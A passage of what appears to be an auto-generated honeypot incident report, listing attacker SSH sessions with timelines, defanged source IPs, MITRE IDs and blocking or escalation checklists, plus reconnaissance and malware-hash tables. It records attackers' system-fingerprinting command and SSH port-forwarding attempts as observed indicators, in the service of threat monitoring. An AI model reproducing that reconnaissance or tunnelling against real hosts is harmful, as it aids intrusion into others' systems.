| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:42:42` | `cowrie.session.connect` |
| `2026-08-30 14:42:42` | `cowrie.client.version` |
| `2026-08-30 14:42:42` | `cowrie.client.kex` |
| `2026-08-30 14:42:43` | `cowrie.login.success` |
| `2026-08-30 14:42:43` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:42:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 14:42:43` | `cowrie.direct-tcpip.data` |
| `2026-08-30 14:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-132debbfa482

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-30 14:43 |
| **Last Seen** | 2026-08-30 14:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:43:01` | `cowrie.session.connect` |
| `2026-08-30 14:43:01` | `cowrie.client.version` |
| `2026-08-30 14:43:01` | `cowrie.client.kex` |
| `2026-08-30 14:43:03` | `cowrie.login.success` |
| `2026-08-30 14:43:04` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a89b3eaebba

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:43 |
| **Last Seen** | 2026-08-30 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:43:46` | `cowrie.session.connect` |
| `2026-08-30 14:43:46` | `cowrie.client.version` |
| `2026-08-30 14:43:46` | `cowrie.client.kex` |
| `2026-08-30 14:43:46` | `cowrie.login.success` |
| `2026-08-30 14:43:47` | `cowrie.session.params` |
| `2026-08-30 14:43:47` | `cowrie.command.input` |
| `2026-08-30 14:43:47` | `cowrie.log.closed` |
| `2026-08-30 14:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0afa47ee9cf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 14:44 |
| **Last Seen** | 2026-08-30 14:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:44:53` | `cowrie.session.connect` |
| `2026-08-30 14:44:53` | `cowrie.client.version` |
| `2026-08-30 14:44:53` | `cowrie.client.kex` |
| `2026-08-30 14:44:54` | `cowrie.login.success` |
| `2026-08-30 14:44:55` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:44:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 14:44:55` | `cowrie.direct-tcpip.data` |
| `2026-08-30 14:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-981115f2e609

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:45 |
| **Last Seen** | 2026-08-30 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:45:12` | `cowrie.session.connect` |
| `2026-08-30 14:45:12` | `cowrie.client.version` |
| `2026-08-30 14:45:12` | `cowrie.client.kex` |
| `2026-08-30 14:45:13` | `cowrie.login.success` |
| `2026-08-30 14:45:13` | `cowrie.session.params` |
| `2026-08-30 14:45:13` | `cowrie.command.input` |
| `2026-08-30 14:45:14` | `cowrie.log.closed` |
| `2026-08-30 14:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a0c18bade5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:45 |
| **Last Seen** | 2026-08-30 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:45:16` | `cowrie.session.connect` |
| `2026-08-30 14:45:16` | `cowrie.client.version` |
| `2026-08-30 14:45:17` | `cowrie.client.kex` |
| `2026-08-30 14:45:17` | `cowrie.login.success` |
| `2026-08-30 14:45:18` | `cowrie.session.params` |
| `2026-08-30 14:45:18` | `cowrie.command.input` |
| `2026-08-30 14:45:18` | `cowrie.log.closed` |
| `2026-08-30 14:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8827f47c75b4

| Field | Detail |
|---|---|
| **Source IP** | `61.185.30[.]170` |
| **First Seen** | 2026-08-30 14:46 |
| **Last Seen** | 2026-08-30 14:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:46:40` | `cowrie.session.connect` |
| `2026-08-30 14:46:41` | `cowrie.client.version` |
| `2026-08-30 14:46:41` | `cowrie.client.kex` |
| `2026-08-30 14:46:45` | `cowrie.login.success` |
| `2026-08-30 14:46:45` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.185.30[.]170` to AbuseIPDB if not already reported
- [ ] Block `61.185.30[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53bcc31aa5df

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-08-30 14:46 |
| **Last Seen** | 2026-08-30 14:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:46:51` | `cowrie.session.connect` |
| `2026-08-30 14:46:52` | `cowrie.client.version` |
| `2026-08-30 14:46:52` | `cowrie.client.kex` |
| `2026-08-30 14:46:54` | `cowrie.login.success` |
| `2026-08-30 14:46:55` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c478c715a91a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:46 |
| **Last Seen** | 2026-08-30 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:46:51` | `cowrie.session.connect` |
| `2026-08-30 14:46:51` | `cowrie.client.version` |
| `2026-08-30 14:46:51` | `cowrie.client.kex` |
| `2026-08-30 14:46:51` | `cowrie.login.success` |
| `2026-08-30 14:46:52` | `cowrie.session.params` |
| `2026-08-30 14:46:52` | `cowrie.command.input` |
| `2026-08-30 14:46:52` | `cowrie.log.closed` |
| `2026-08-30 14:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-502bd4daffe2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:47 |
| **Last Seen** | 2026-08-30 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:47:53` | `cowrie.session.connect` |
| `2026-08-30 14:47:53` | `cowrie.client.version` |
| `2026-08-30 14:47:53` | `cowrie.client.kex` |
| `2026-08-30 14:47:54` | `cowrie.login.success` |
| `2026-08-30 14:47:55` | `cowrie.session.params` |
| `2026-08-30 14:47:55` | `cowrie.command.input` |
| `2026-08-30 14:47:55` | `cowrie.log.closed` |
| `2026-08-30 14:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55f99950e54e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:48 |
| **Last Seen** | 2026-08-30 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:48:29` | `cowrie.session.connect` |
| `2026-08-30 14:48:29` | `cowrie.client.version` |
| `2026-08-30 14:48:29` | `cowrie.client.kex` |
| `2026-08-30 14:48:29` | `cowrie.login.success` |
| `2026-08-30 14:48:30` | `cowrie.session.params` |
| `2026-08-30 14:48:30` | `cowrie.command.input` |
| `2026-08-30 14:48:30` | `cowrie.log.closed` |
| `2026-08-30 14:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b012f2ade7d5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:50 |
| **Last Seen** | 2026-08-30 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:50:07` | `cowrie.session.connect` |
| `2026-08-30 14:50:07` | `cowrie.client.version` |
| `2026-08-30 14:50:07` | `cowrie.client.kex` |
| `2026-08-30 14:50:08` | `cowrie.login.success` |
| `2026-08-30 14:50:09` | `cowrie.session.params` |
| `2026-08-30 14:50:09` | `cowrie.command.input` |
| `2026-08-30 14:50:09` | `cowrie.log.closed` |
| `2026-08-30 14:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a54de536f5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:50 |
| **Last Seen** | 2026-08-30 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:50:27` | `cowrie.session.connect` |
| `2026-08-30 14:50:27` | `cowrie.client.version` |
| `2026-08-30 14:50:27` | `cowrie.client.kex` |
| `2026-08-30 14:50:28` | `cowrie.login.success` |
| `2026-08-30 14:50:28` | `cowrie.session.params` |
| `2026-08-30 14:50:28` | `cowrie.command.input` |
| `2026-08-30 14:50:29` | `cowrie.log.closed` |
| `2026-08-30 14:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d37eee15df21

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:51 |
| **Last Seen** | 2026-08-30 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:51:47` | `cowrie.session.connect` |
| `2026-08-30 14:51:47` | `cowrie.client.version` |
| `2026-08-30 14:51:47` | `cowrie.client.kex` |
| `2026-08-30 14:51:47` | `cowrie.login.success` |
| `2026-08-30 14:51:48` | `cowrie.session.params` |
| `2026-08-30 14:51:48` | `cowrie.command.input` |
| `2026-08-30 14:51:48` | `cowrie.log.closed` |
| `2026-08-30 14:51:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-919791630200

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:53 |
| **Last Seen** | 2026-08-30 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:53:03` | `cowrie.session.connect` |
| `2026-08-30 14:53:03` | `cowrie.client.version` |
| `2026-08-30 14:53:03` | `cowrie.client.kex` |
| `2026-08-30 14:53:03` | `cowrie.login.success` |
| `2026-08-30 14:53:04` | `cowrie.session.params` |
| `2026-08-30 14:53:04` | `cowrie.command.input` |
| `2026-08-30 14:53:04` | `cowrie.log.closed` |
| `2026-08-30 14:53:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8438d5b5b569

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 14:53 |
| **Last Seen** | 2026-08-30 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:53:28` | `cowrie.session.connect` |
| `2026-08-30 14:53:28` | `cowrie.client.version` |
| `2026-08-30 14:53:29` | `cowrie.client.kex` |
| `2026-08-30 14:53:29` | `cowrie.login.success` |
| `2026-08-30 14:53:30` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:53:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 14:53:30` | `cowrie.direct-tcpip.data` |
| `2026-08-30 14:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa7567aad648

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:53 |
| **Last Seen** | 2026-08-30 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:53:30` | `cowrie.session.connect` |
| `2026-08-30 14:53:30` | `cowrie.client.version` |
| `2026-08-30 14:53:30` | `cowrie.client.kex` |
| `2026-08-30 14:53:31` | `cowrie.login.success` |
| `2026-08-30 14:53:31` | `cowrie.session.params` |
| `2026-08-30 14:53:31` | `cowrie.command.input` |
| `2026-08-30 14:53:31` | `cowrie.log.closed` |
| `2026-08-30 14:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70e224d97554

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 14:54 |
| **Last Seen** | 2026-08-30 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:54:31` | `cowrie.session.connect` |
| `2026-08-30 14:54:31` | `cowrie.client.version` |
| `2026-08-30 14:54:31` | `cowrie.client.kex` |
| `2026-08-30 14:54:32` | `cowrie.login.success` |
| `2026-08-30 14:54:32` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:54:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 14:54:33` | `cowrie.direct-tcpip.data` |
| `2026-08-30 14:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **9** | 2026-08-30 11:10 | 2026-08-30 14:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `85.165.104[.]58` | **5** | 2026-08-30 14:43 | 2026-08-30 14:44 | 4m | 0 | `T1592` | 🟢 LOW |
| `174.173.176[.]186` | **3** | 2026-08-30 11:24 | 2026-08-30 11:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.67.59[.]27` | **3** | 2026-08-30 11:09 | 2026-08-30 11:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.32.177[.]240` | **3** | 2026-08-30 13:48 | 2026-08-30 13:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.221.57[.]151` | **2** | 2026-08-30 11:09 | 2026-08-30 11:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.45.68[.]149` | **2** | 2026-08-30 11:17 | 2026-08-30 11:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]128` | **2** | 2026-08-30 11:58 | 2026-08-30 11:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]126` | **2** | 2026-08-30 12:49 | 2026-08-30 12:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-08-30 11:55 | 2026-08-30 12:09 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.98.18[.]138` | 1 | 2026-08-30 13:09 | 2026-08-30 13:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `107.137.145[.]52` | 1 | 2026-08-30 13:06 | 2026-08-30 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.114.84[.]246` | 1 | 2026-08-30 13:33 | 2026-08-30 13:33 | 8s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]29` | 1 | 2026-08-30 11:31 | 2026-08-30 11:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `159.203.84[.]92` | 1 | 2026-08-30 14:52 | 2026-08-30 14:52 | 8s | 0 | `T1592` | 🟢 LOW |
| `180.76.112[.]91` | 1 | 2026-08-30 11:10 | 2026-08-30 11:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.75.248[.]87` | 1 | 2026-08-30 13:03 | 2026-08-30 13:03 | 3s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-30 14:31 | 2026-08-30 14:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]53` | 1 | 2026-08-30 11:57 | 2026-08-30 11:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.193.153[.]215` | 1 | 2026-08-30 12:29 | 2026-08-30 12:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `201.63.52[.]54` | 1 | 2026-08-30 10:55 | 2026-08-30 10:55 | 7s | 0 | `T1592` | 🟢 LOW |
| `221.120.4[.]61` | 1 | 2026-08-30 12:22 | 2026-08-30 12:22 | 6s | 0 | `T1592` | 🟢 LOW |
| `42.200.60[.]186` | 1 | 2026-08-30 12:34 | 2026-08-30 12:34 | 2s | 0 | `T1592` | 🟢 LOW |
| `42.240.164[.]208` | 1 | 2026-08-30 11:38 | 2026-08-30 11:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-08-30 11:37 | 2026-08-30 11:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-08-30 14:33 | 2026-08-30 14:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.59.88[.]25` | 1 | 2026-08-30 11:25 | 2026-08-30 11:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.77.70[.]142` | 1 | 2026-08-30 12:38 | 2026-08-30 12:39 | 27s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-08-30 13:36 | 2026-08-30 13:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-08-30 13:13 | 2026-08-30 13:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]171` | 1 | 2026-08-30 13:00 | 2026-08-30 13:01 | 15s | 0 | `T1592` | 🟢 LOW |
| `71.187.203[.]185` | 1 | 2026-08-30 14:11 | 2026-08-30 14:11 | 10s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-08-30 14:49 | 2026-08-30 14:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]1` | 1 | 2026-08-30 12:28 | 2026-08-30 12:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]43` | 1 | 2026-08-30 12:13 | 2026-08-30 12:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.24.246[.]216` | 1 | 2026-08-30 10:58 | 2026-08-30 11:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.225.162[.]14` | 1 | 2026-08-30 11:31 | 2026-08-30 11:31 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
